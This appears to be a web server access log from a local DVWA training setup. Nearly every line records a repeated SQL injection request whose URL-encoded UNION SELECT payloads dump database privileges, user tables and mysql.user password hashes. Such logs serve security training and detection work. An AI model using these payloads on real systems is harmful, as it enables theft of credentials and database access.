::1 - - [11/Nov/2019:14:24:33 +0800] "GET /phpmyadmin/themes/pmahomme/img/b_select.png HTTP/1.1" 200 593 "http://localhost/phpmyadmin/phpmyadmin.css.php?nocache=6088723570ltr&server=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit HTTP/1.1" 200 21368 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user%2Cpassword+from+users%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1570 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1570 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1570 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:05 +0800] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 404 1570 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:19 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:04:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
